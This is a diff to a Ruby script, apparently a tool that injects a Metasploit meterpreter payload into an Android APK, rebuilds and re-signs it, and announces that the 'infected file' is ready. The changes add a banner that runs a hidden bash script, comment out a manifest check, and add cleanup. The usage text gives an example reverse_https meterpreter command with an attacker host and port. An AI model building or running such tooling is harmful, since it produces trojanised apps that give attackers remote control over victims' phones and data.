@@ -50,6 +50,11 @@ def run_cmd(cmd)
   return stdout, stderr, status
 end
 
+def banner()
+  banner_output, _, _ = run_cmd(['bash', '.IbyC/embed'])
+  puts banner_output
+end
+  
 def usage()
   print "[Usage]─➤ ".cyan,"embed [target.apk] [msfvenom options]"
   print "[ex]─➤ ".green,"embed anyapp.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443"
@@ -299,6 +304,7 @@ end
 
 # Set signer key file || default was maded on nov/2022 with android debugging parameters
 cleaning_up()
+banner()
 print "[?]─➤ Set a keystore signer
 {1}─➤ ".cyan,"Using the original apk credentials"," 
 {2}─➤ ".cyan,"Using your own key"," 
@@ -415,10 +421,21 @@ print_status("Rebuilding #{apkfile} with meterpreter injection as #{injected_apk
 for i in (1..3) do
   stdout, stderr, status = run_cmd(['apktool', 'b', '-f', '-o', "#{cwd}/#{injected_apk}", "#{cwd}/original"])
   apktool_output = stdout + stderr
+#######= VALIDA SI EL AndroidManifest ESTA CORRUPTO O NO =#############################
+  # stdout, stderr, status = run_cmd([
+  #   'aapt', 'dump', 'badging', "#{cwd}/#{injected_apk}"
+  # ])
+  # aapt_dump_output = stdout + stderr
+  
   if !status.success?
     print_error(apktool_output)
     cleaning_up()
     raise RuntimeError, "Unable to rebuild.. Retrying[#{i}].."
+  # elsif !status.success?
+  #   print_error(aapt_dump_output)
+  #   cleaning_up()
+  #   raise RuntimeError, "AndroidManifest.xml is corrupt.. Retrying[#{i}].."
+########= SE COMENTA LA LINEA TEMPORALMENTE PARA PROBAR SOLLUCION #####################
   else
     break
   end
@@ -461,5 +478,6 @@ if !status.success? || apksigner_verify.to_s.include?('DOES NOT VERIFY') || apks
   raise RuntimeError, 'Signature verification failed.'
   exit(1)
 else
+  cleaning_up()
   print "[DONE]─➤ Infected file is ready in: ".green,"#{cwd}/#{final_apk}."
 end
